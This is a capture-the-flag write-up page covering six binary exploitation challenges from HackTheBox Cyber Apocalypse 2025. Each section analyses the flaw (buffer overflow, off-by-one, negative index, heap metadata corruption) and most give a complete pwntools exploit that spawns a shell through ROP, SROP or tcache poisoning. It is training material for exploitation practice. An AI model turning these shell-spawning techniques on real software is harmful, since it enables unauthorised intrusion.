---
layout: default
title: "HTB Cyber Apocalypse 2025 - Tales from Eldoria Writeups"
description: "Writeups of pwn challenges."
og_description: "Writeups of pwn challenges."
og_type: "ctf writeup"
keywords: "writeups,Sarvesh Aadhithya,CTFs, Hackthebox, HTB, Cyber Apocalypse, Tales from eldoria,zoozoo-sec, zoozoo"

permalink: /writeups/HackTheBox-CyberApocalypse2025/
---

<!-- Link Bootstrap CSS (add this to your <head> if it's not already included) -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/themes/prism-tomorrow.min.css" integrity="sha512-kSwGoyIkfz4+hMo5jkJngSByil9jxJPKbweYec/UgS+S1EgE45qm4Gea7Ks2oxQ7qiYyyZRn66A9df2lMtjIsw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="{{ '/writeups/writeup-page.css' | relative_url }}" />

<section id="back">
<div id="challenge-links">
        <h1 class="text"><code>HackTheBox Cyber Apocalypse 2025</code></h1>
        <ul class="list-unstyled">
            <li><a href="#quack-quack"><code>Quack-Quack</code></a></li>
            <li><a href="#blessing"><code>Blessing</code></a></li>
            <li><a href="#laconic"><code>Laconic</code></a></li>
            <li><a href="#crossbow"><code>Crossbow</code></a></li>
            <li><a href="#contractor"><code>Contractor</code></a></li>
            <li><a href="#strategist"><code>Strategist</code></a></li>
        </ul>
    </div>
</section>

<section id="back">
<section id="blueback" class="container">
    <div id="quack-quack" class="challenge-section">
        <div class="section-content">
            <b>Name:</b> <span class="text"> Quack-Quack </span><br>
            <b>Category:</b> Binary Exploitation <br>
            <b>Difficulty:</b> Very Easy <br>
            <p>
               <br> In this challenge, we are given a binary, and our goal is to exploit a buffer overflow vulnerability to execute the <code>duck_attack()</code> function and retrieve the flag.
            </p>
        </div>
        <div class="section-content">
            <h2>Initial Analysis</h2>
            <h5>Checksec Findings</h5>
            <pre><code class="language-bash">checksec --file=quack_quack</code></pre>
        <h3>Security Features</h3>
        <ul>
            <li><b><code>No PIE</code>  (Position Independent Executable):</b> This means addresses remain fixed, making it easier to exploit.</li>
            <li><b><code>Stack Canary enabled</code> :</b> We need to bypass it before modifying the return address.</li>
            <li><b><code>NX is enabled</code>:</b> We can't execute shellcode in writable memory, so we need to use a return-to-function exploit.</li>
        </ul>
<pre><code class="language-bash">RELRO           STACK CANARY      NX            PIE             
Full RELRO      Canary found      NX enabled    No PIE</code></pre>
</div>
        <div class="section-content">
            <h3>Disassembly Analysis:</h3>
            <pre><code class="language-python">read(0, buf, 0x66uLL);</code></pre>
            <ul>
                <li>The first <code>read()</code> reads <b>102 bytes (0x66)</b> into <code>buf</code>, but <code>buf</code> is only <b>4x8 = 32 bytes</b> long. This means we can overflow into the canary.</li>
                <li>The input is checked for the substring <b>"Quack Quack "</b>.</li>
                <li>The correct input is printed back, leaking the stack canary.</li>
            </ul>
        </div>
        <div class="section-content">
            <h3>Exploitation Plan:</h3>
            <ol>
                <li><b>Leak the canary</b> using the first <code>read()</code>.</li>
                <li><b>Overflow into the return address</b> in the second <code>read()</code>.</li>
                <li><b>Redirect execution to <code>duck_attack()</code></b>, which gives us the flag.</li>
            </ol>
        </div>
        <div class="section-content">
            <h3>Exploit Development</h3>
            <h4>Step 1: Leak the Canary</h4>
            <pre><code class="language-python">payload1 = b"A"*89  # Overwrite up to canary
payload1 += b"Quack Quack "  # Trigger correct input check</code></pre>
            <h4>Step 2: Overwrite the Return Address</h4>
            <pre><code class="language-python">payload2 = b"B"*88  # Fill buffer up to canary
payload2 += p64(canary)  # Insert correct canary value
payload2 += b"B"*8  # Overwrite saved RBP
payload2 += b"\x7f\x13"  # Address of duck_attack()</code></pre>
            <h5>This ensures we:</h5>
            <ul>
                <li>Preserve the canary (to avoid crashing).</li>
                <li>Overwrite the return address to <code>duck_attack()</code>.</li>
            </ul>
            <h4>Step 3: Send Payload</h4>
            <pre><code class="language-python">io.sendline(payload2)
io.interactive()</code></pre>
        </div>
        <div class="section-content">
            <div class="h4-wrapper">
        <h4>Complete Exploit:</h4>
             <button class="copy-btn">Copy</button>
    </div><pre><code class="language-python">from pwn import *
io = process("quack_quack")

# Leak Canary
payload1 = b"A"*89
payload1 += b"Quack Quack "
io.recvuntil(b">")
io.sendline(payload1)
canary = int.from_bytes(b'\x00' + io.recvuntil(b">")[13:20], 'little')

# Construct second payload
payload2 = b"B"*88
payload2 += p64(canary)
payload2 += b"B"*8
payload2 += b"\x7f\x13"  # Address of duck_attack()

# Send final payload
io.sendline(payload2)
io.interactive()</code></pre>
        </div>
    </div>
</section>
</section>


<section id="back">
<section id="blueback" class="container">
    <div id="blessing" class="challenge-section">
        <div class="section-content">
            <b>Name:</b> <span class="text"> Blessing </span><br>
            <b>Category:</b> Binary Exploitation <br>
            <b>Difficulty:</b> Very Easy <br>
            <p>
               <br> In this challenge, we are given a binary that interacts with a Bard who provides a **memory leak** and allows us to **write past an allocated buffer**. The goal is to use an **off-by-one write** to set a heap-allocated pointer to `0`, bypass a conditional check, and call `read_flag()` to retrieve the flag.
            </p>
        </div>
        <div class="section-content">
            <h2>Vulnerability Analysis</h2>
            <h5>Relevant Code Snippet</h5>
            <pre><code class="language-c">  v6 = malloc(0x30000uLL);
  *v6 = 1LL;
  printf("%p", v6); // Leaks the allocated pointer
  
  printf("Give me the song's length: ");
  __isoc99_scanf("%lu", &size);
  buf = malloc(size);
  read(0, buf, size);
  *(_QWORD *)((char *)buf + size - 1) = 0LL;

  if (*v6)
    printf("Your song was not as good as expected...\n");
  else
    read_flag();</code></pre>
        </div>
        <div class="section-content">
            <h3>Exploitation Plan:</h3>
            <ol>
                <li><b>Leak a Heap Address:</b> The program prints the pointer allocated with `malloc(0x30000)`, revealing its address.</li>
                <li><b>Control the Overwrite:</b> The buffer allows an off-by-one write at `buf + size - 1`.</li>
                <li><b>Overwrite `v6`:</b> Carefully set `size` such that `buf + size - 1` lands on `v6`.</li>
                <li><b>Trigger `read_flag()`:</b> Setting `*v6 = 0` bypasses the check and calls `read_flag()`.</li>
            </ol>
        </div>
        <div class="section-content">
            <h3>Exploit Proof</h3>
            <img src="{{ '/writeups/HackTheBox-CyberApocalypse2025/assets/blessing.png' | relative_url }}" alt="blessing" class="side-image" />
        </div>
    </div>
</section>
</section>



<section id="back">
<section id="blueback" class="container">
    <div id="laconic" class="challenge-section">
        <div class="section-content">
            <b>Name:</b> <span class="text"> Laconic </span><br>
            <b>Category:</b> Binary Exploitation <br>
            <b>Difficulty:</b> Easy <br>
            <p>
               <br> In this challenge, we analyze a binary with a **stack buffer overflow** vulnerability. Our goal is to exploit the lack of **stack protections**, leverage **Sigreturn Oriented Programming (SROP)**, and execute **execve("/bin/sh")** to gain a shell.
            </p>
        </div>
        <div class="section-content">
            <h2>Initial Analysis</h2>
            <h5>Checksec Findings</h5>
            <pre><code class="language-bash">checksec --file=laconic</code></pre>
        <h3>Security Features</h3>
        <ul>
            <li><b><code>No PIE</code>:</b> The binary loads at a fixed address.</li>
            <li><b><code>No Stack Canary</code>:</b> No protection against buffer overflows.</li>
            <li><b><code>NX Disabled</code>:</b> We can execute shellcode on the stack.</li>
            <li><b><code>No RELRO</code>:</b> The GOT is writable.</li>
        </ul>
<pre><code class="language-python">RELRO        STACK CANARY      NX       PIE    
No RELRO     No Canary        NX Disabled   No PIE</code></pre>
</div>
        <div class="section-content">
            <h3>Exploitation Plan:</h3>
            <ol>
                <li><b>Trigger Stack Buffer Overflow:</b> Overflow the buffer to gain control over execution.</li>
                <li><b>Utilize SROP Technique:</b> Use the **pop rax** gadget to set up a fake sigreturn frame.</li>
                <li><b>Execute execve("/bin/sh"):</b> Modify registers to execute a system shell.</li>
            </ol>
        </div>
        <div class="section-content">
            <h3>Exploit Development</h3>
            <h4>Step 1: Locate Useful Gadgets</h4>
            <pre><code class="language-python">pop_rax = 0x0000000000043018  # Pop value into RAX
syscall = 0x0000000000043015  # Syscall instruction</code></pre>
            <h4>Step 2: Construct Sigreturn Frame</h4>
            <pre><code class="language-python">frame = SigreturnFrame()
frame.rax = 59  # execve syscall
frame.rdi = bin_sh  # Pointer to /bin/sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall</code></pre>
            <h4>Step 3: Send Exploit Payload</h4>
            <pre><code class="language-python">payload = b'A'*8 + pack(pop_rax) + pack(15) + pack(syscall) + bytes(frame)
io.sendline(payload)</code></pre>
        </div>
        <div class="section-content">
            <div class="h4-wrapper">
        <h4>Complete Exploit:</h4>
             <button class="copy-btn">Copy</button>
    </div><pre><code class="language-python" >#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./laconic')
pop_rax = 0x0000000000043018
syscall = 0x0000000000043015
bin_sh = 0x43238

# io = process()  # Local testing
io = connect('94.237.63.32', 37995)  # Remote connection

frame = SigreturnFrame()
frame.rax = 59  # execve syscall
frame.rdi = bin_sh  # Address of '/bin/sh'
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall  # Call syscall instruction

payload = b'A'*8 + pack(pop_rax) + pack(15) + pack(syscall) + bytes(frame)
print(hex(len(payload)))

io.sendline(payload)
io.interactive()</code></pre>
        </div>
    </div>
</section>
</section>


<section id="back">
    <section id="blueback" class="container">
        <div id="crossbow" class="challenge-section">
            <div class="section-content">
                <b>Name:</b> <span class="text"> Crossbow </span><br>
                <b>Category:</b> Binary Exploitation <br>
                <b>Difficulty:</b> Easy <br>
                <p>
                   <br> In this challenge, we analyze an integer overflow vulnerability that enables memory overwriting, leading to stack pivoting and arbitrary code execution.
                </p>
            </div>
            <div class="section-content">
                <h2>Security Mitigations</h2>
                <h5>Checksec Findings</h5>
                <pre><code class="language-python">RELRO           STACK CANARY      NX           PIE 
Partial RELRO   Canary found    NX enabled    No PIE</code></pre>
                <h3>Security Features</h3>
                <ul>
                    <li><b><code>No PIE</code>:</b> Fixed address space, making ROP easier.</li>
                    <li><b><code>NX Enabled</code>:</b> Prevents direct shellcode execution, requiring ROP.</li>
                    <li><b><code>Stack Canary Found</code>:</b> Protection against stack smashing, bypassed via integer overflow.</li>
                    <li><b><code>Partial RELRO</code>:</b> GOT overwrite is possible but unnecessary for this exploit.</li>
                </ul>
            </div>
            <div class="section-content">
                <h3>Vulnerability Analysis</h3>
                <pre><code class="language-c">if ( (unsigned int)scanf((unsigned int)"%d%*c", (unsigned int)&v18, v6, v7, v8, v9) != 1 )</code></pre>
                <ul>
                    <li><code>v18</code> is a signed integer, and no check is performed for negative values.</li>
                    <li>Providing a negative index allows memory access outside the intended array.</li>
                    <li>Next, the program executes:</li>
                </ul>
                <pre><code class="language-c">v12 = (_QWORD *)(8LL * v18 + a1);
*v12 = calloc(1LL, 128LL);</code></pre>
                <ul>
                    <li>With a negative <code>v18</code>, unintended memory regions can be overwritten, including the return pointer.</li>
                </ul>
            </div>
            <div class="section-content">
                <h3>Exploitation Plan</h3>
                <ol>
                    <li>Pass <code>-2</code> as input to overwrite memory where the return address is stored.</li>
                    <li>Trigger stack pivoting, redirecting execution flow to controlled heap memory.</li>
                    <li>Use a ROP chain to execute a <code>syscall</code> and spawn a shell.</li>
                </ol>
            </div>
            <div class="section-content">
                <h3>Exploit Explanation</h3>
                <ul>
                    <li>We send <code>-2</code> as input, allowing us to overwrite a pointer on the stack.</li>
                    <li>Execution shifts to our <code>calloc</code> region after function epilogues.</li>
                    <li>Using ROP, we first write <code>"/bin/bash"</code> into writable memory.</li>
                    <li>Next, we execute the <code>execve</code> syscall (<code>syscall 0x3b</code>) to spawn a shell.</li>
                    <li>Finally, we interact with the shell.</li>
                </ul>
            </div>
            <div class="section-content">
                <<div class="h4-wrapper">
        <h4>Complete Exploit:</h4>
             <button class="copy-btn">Copy</button>
    </div><pre><code class="language-python">from pwn import *

# Connect to remote or local process
# io = remote("94.237.58.215", 40276)
io = process("./challenge/crossbow")

# Send the negative index to trigger stack pivoting
io.sendline(b"-2")

# Build ROP chain
stack = p64(0xdeadbeef)  # Padding
stack += p64(0x0000000000401d6c) # pop rdi; ret
stack += p64(0)  # Null out rdi

stack += p64(0x0000000000401139) # pop rdx; ret
stack += p64(0x40d000)  # Writable memory
stack += p64(0x4017c4) # xor rax, rax; ret
stack += p64(0x0000000000404b4f) # syscall

# Spawn a shell
stack += p64(0x0000000000401d6c) # pop rdi; ret
stack += p64(0x40d000)  # Pointer to "/bin/bash"
stack += p64(0x0000000000401139) # pop rdx; ret
stack += p64(0x40d010)  # Null pointer for argv
stack += p64(0x0000000000401001) # pop rax; ret
stack += p64(0x3b)  # execve syscall number
stack += p64(0x000000000040566b) # pop rsi; ret
stack += p64(0x40d010)  # Null pointer for envp
stack += b'QK@\x00\x00\x00\x00\x00'  # syscall

# Send payload
io.send(stack)
io.sendline(b"/bin/bash\x00\x00\x00\x00\x00\x00\x00" + p64(0x40d000) + b"\x00"*50)

# Interact with the shell
io.interactive()</code></pre>
            </div>
        </div>
    </section>
</section>



<section id="back">
    <section id="blueback" class="container">
        <div id="contractor" class="challenge-section">
            <div class="section-content">
                <b>Name:</b> <span class="text"> Contractor </span><br>
                <b>Category:</b> Binary Exploitation <br>
                <b>Difficulty:</b> Medium <br>
                <p>
                   <br> This challenge presents a binary vulnerable to **stack-based buffer overflow**. The objective is to exploit an **out-of-bounds write** to modify a function pointer and hijack execution flow to gain a shell.
                </p>
            </div>
            <div class="section-content">
                <h2>Initial Analysis</h2>
                <h5>Checksec Findings</h5>
                <pre><code class="language-bash">checksec --file=contractor</code></pre>
                <h3>Security Features</h3>
                <ul>
                    <li><b><code>Full RELRO</code>:</b> No GOT overwrite possible.</li>
                    <li><b><code>Canary Found</code>:</b> Stack protection is enabled.</li>
                    <li><b><code>NX enabled</code>:</b> No shellcode execution on the stack.</li>
                    <li><b><code>PIE enabled</code>:</b> ASLR is in place.</li>
                </ul>
                <pre><code class="language-bash">RELRO           STACK CANARY      NX            PIE             
Full RELRO      Canary found      NX enabled    PIE enabled</code></pre>
            </div>
            <div class="section-content">
                <h3>Exploitation Plan:</h3>
                <ol>
                    <li><b>Leak Binary Address:</b> Overflow "reason to join" to retrieve a stack leak.</li>
                    <li><b>Modify Specialty Pointer:</b> Overflow "specialty" input to redirect execution.</li>
                    <li><b>Hijack Execution Flow:</b> Redirect execution to `contract()` to spawn a shell.</li>
                    <li><b>Brute-force Execution:</b> Since ASLR is enabled, multiple attempts improve success rate.</li>
                </ol>
            </div>
            <div class="section-content">
                <h3>Exploit Development</h3>
                <h4>Step 1: Leak Binary Address</h4>
                <pre><code class="language-python">io.sendline(b"N" * 0xF)  # Fill name input
io.sendline(b"R" * 0xff)  # Overflow "reason to join" to leak stack address</code></pre>
                <h4>Step 2: Modify Specialty Pointer</h4>
                <pre><code class="language-python">payload = b"\xe8" * 24  # Overflow buffer
payload += p64(0x1)  # Padding
payload += b"\xef"  # Overwrite return address
payload += p64(contract_leak)  # Redirect execution</code></pre>
                <h4>Step 3: Trigger Execution</h4>
                <pre><code class="language-python">io.sendline(payload)
io.sendline(b"Yes")  # Confirm input</code></pre>
            </div>
            <div class="section-content">
                <div class="h4-wrapper">
        <h4>Complete Exploit:</h4>
             <button class="copy-btn">Copy</button>
    </div><pre><code class="language-python">from pwn import *

while True:
    io = process("./contractor")
    io.sendline(b"N" * 0xF)  # Fill name input
    io.sendline(b"R" * 0xff)  # Overflow reason input to leak stack address
    io.sendline(b"1" * 8)  # Set age input
    io.sendline(b"S" * 0x10)  # Specialty input

    # Leak binary address from stack
    junk = io.recvuntil(b"SSSSSSSSSSSSSSSS")
    contract_leak = int.from_bytes(io.recv(6), 'little') - 2061

    io.sendline(b"4")  # Modify specialty option

    # Craft payload to overwrite specialty pointer
    payload = b"\xe8" * 24  # Overflow buffer
    payload += p64(0x1)  # Padding
    payload += b"\xef"  # Overwrite return address last byte
    payload += p64(contract_leak)  # Redirect to contract() function
    io.sendline(payload)

    io.sendline(b"Yes")  # Confirm input
    io.sendline(b"cat flag.txt")  # Get flag
    io.interactive()</code></pre>
            </div>
        </div>
    </section>
</section>


<section id="back">
<section id="blueback" class="container">
    <div id="strategist" class="challenge-section">
        <div class="section-content">
            <b>Name:</b> <span class="text"> Strategist </span><br>
            <b>Category:</b> Binary Exploitation <br>
            <b>Difficulty:</b> Medium <br>
            <p>
               <br> In this challenge, we are given a binary with heap-based vulnerabilities. The goal is to exploit an **off-by-one** vulnerability to perform **tcache poisoning**, leak a **libc address**, and ultimately gain a shell.
            </p>
        </div>
        <div class="section-content">
            <h2>Initial Analysis</h2>
            <h5>Checksec Findings</h5>
            <pre><code class="language-bash">checksec --file=strategist</code></pre>
        <h3>Security Features</h3>
        <ul>
            <li><b><code>PIE enabled</code>:</b> ASLR is in place, so we need an information leak.</li>
            <li><b><code>NX enabled</code>:</b> We cannot execute shellcode on the stack.</li>
            <li><b><code>Partial RELRO</code>:</b> Some GOT entries might be writable.</li>
        </ul>
<pre><code class="language-bash">RELRO           STACK CANARY      NX            PIE             
Partial RELRO   No Canary        NX enabled    PIE enabled</code></pre>
</div>
        <div class="section-content">
            <h3>Exploitation Plan:</h3>
            <ol>
                <li><b>Trigger an Off-by-One Bug:</b> Use `edit_plan()` to overwrite heap metadata.</li>
                <li><b>Leak a Libc Address:</b> Free a chunk into the **unsorted bin** and read its metadata.</li>
                <li><b>Perform Tcache Poisoning:</b> Corrupt the tcache freelist to allocate memory at controlled addresses.</li>
                <li><b>Hijack Execution Flow:</b> Use **ROP (Return-Oriented Programming)** to execute `system("/bin/sh")`.</li>
            </ol>
        </div>
        <div class="section-content">
            <h3>Exploit Development</h3>
            <h4>Step 1: Allocate and Free Chunks</h4>
            <pre><code class="language-python">create(r, 24, b'A' * 23)  # Chunk A
create(r, 24, b'B' * 23)  # Chunk B
create(r, 0x50, b'C' * 24)  # Chunk C
create(r, 0x50, b'/bin/sh\x00')  # Chunk D
</code></pre>
            <h4>Step 2: Corrupt Heap Metadata</h4>
            <pre><code class="language-python">edit(r, 1, b'B' * 24 + p8(0xc1))  # Overwrite next chunk's size</code></pre>
            <h4>Step 3: Leak a Libc Address</h4>
            <pre><code class="language-python">delete(r, 2)
leaked = create(r, 80, b'')
libc_base = u64(leaked.ljust(8, b'\x00')) - libc.symbols['main_arena']
print(f"Libc base: {hex(libc_base)}")</code></pre>
            <h4>Step 4: Tcache Poisoning & ROP</h4>
            <pre><code class="language-python"># Use tcache poisoning to hijack execution and gain shell</code></pre>
        </div>
        <div class="section-content">
            <div class="h4-wrapper">
        <h4>Complete Exploit:</h4>
             <button class="copy-btn">Copy</button>
    </div><pre><code class="language-python">#!/usr/bin/env python3

from pwn import *

exe = ELF("strategist")
libc = ELF("glibc/libc.so.6")
ld = ELF("glibc/ld-linux-x86-64.so.2")
context.binary = exe
idx = 1

def create(r,size,data):
    global idx
    r.recvuntil(b'> ')
    r.sendline(b'1')
    r.recvuntil(b'> ')
    r.sendline(str(size).encode())
    r.recvuntil(b'> ')
    r.sendline(data)
    idx = idx+1
    return idx-1
def show(r,idx):
    r.recvuntil(b'> ')
    r.sendline(b'2')
    r.recvuntil(b'> ')
    r.sendline(str(idx).encode())
    r.recvuntil(b'Plan [')
    leaks = r.recvline().strip()
    idx = int(leaks.split(b']')[0])
    print(idx)
    return idx
def edit(r,idx,data):
    r.recvuntil(b'> ')
    r.sendline(b'3')
    r.recvuntil(b'> ')
    r.sendline(str(idx).encode())
    r.recvuntil(b'> ')
    r.send(data)
def delete(r,idx):
    r.recvuntil(b'> ')
    r.sendline(b'4')
    r.recvuntil(b'> ')
    r.sendline(str(idx).encode())

def main():
    r = process("./strategist")
    sleep(1)
    ChunkA = create(r,24,b'A'*23)
    ChunkB = create(r,24,b'B'*23)
    ChunkC = create(r,0x50,b'C'*24)
    ChunkD = create(r,0x50,b'/bin/sh\x00')
    chunkE = create(r,24,b'E'*23)
    
    edit(r,1,b'B'*24+p8(0xc1))

    for i in range(7):
        create(r,0xb0,b'tcache')
    
    for i in range(11,4,-1):
         delete(r,i)
   
    delete(r,2)
    leaked = create(r,80,b'') #2
    leaked = show(r,2)
    leak_libc = u64(r.recvline().strip().ljust(8,b'\0')) << 8
    print(hex(leak_libc))
    libc.address = leak_libc - 0x3ebd00
    print(hex(libc.address))

    create(r,48,b'/bin/sh\x00')
    create(r,24,b'f'*23)
    #edit(r,4,b'f'*24+p64())
    
    delete(r,4)
    delete(r,6)
    create(r,24,b'T'*23)
    
    create(r,24,b'gggggggg')
    edit(r,4,b'T'*24+p8(0x51))
    
    delete(r,6)
    create(r,60,b'8'*24+p64(0xc1)+p64(libc.sym.__free_hook))
    create(r,0xb0,p64(libc.sym.system))
    create(r,0xb0,p64(libc.sym.system))
    delete(r,3)
    #gdb.attach(r)
    r.interactive()

main()</code></pre>
        </div>
    </div>
</section>
</section>



<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/prism.min.js" integrity="sha512-UOoJElONeUNzQbbKQbjldDf9MwOHqxNz49NNJJ1d90yp+X9edsHyJoAs6O4K19CZGaIdjI5ohK+O2y5lBTW6uQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-python.min.js" integrity="sha512-3qtI9+9JXi658yli19POddU1RouYtkTEhTHo6X5ilOvMiDfNvo6GIS6k2Ukrsx8MyaKSXeVrnIWeyH8G5EOyIQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-c.min.js" integrity="sha512-EWIJI7uQnA8ClViH2dvhYsNA7PHGSwSg03FAfulqpsFiTPHfhdQIvhkg/l3YpuXOXRF2Dk0NYKIl5zemrl1fmA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-bash.min.js" integrity="sha512-35RBtvuCKWANuRid6RXP2gYm4D5RMieVL/xbp6KiMXlIqgNrI7XRUh9HurE8lKHW4aRpC0TZU3ZfqG8qmQ35zA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<!-- Link Bootstrap JS and Popper.js (add these at the end of the <body>) -->
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>
<script src="{{ '/writeups/copy.js' | relative_url }}"></script>

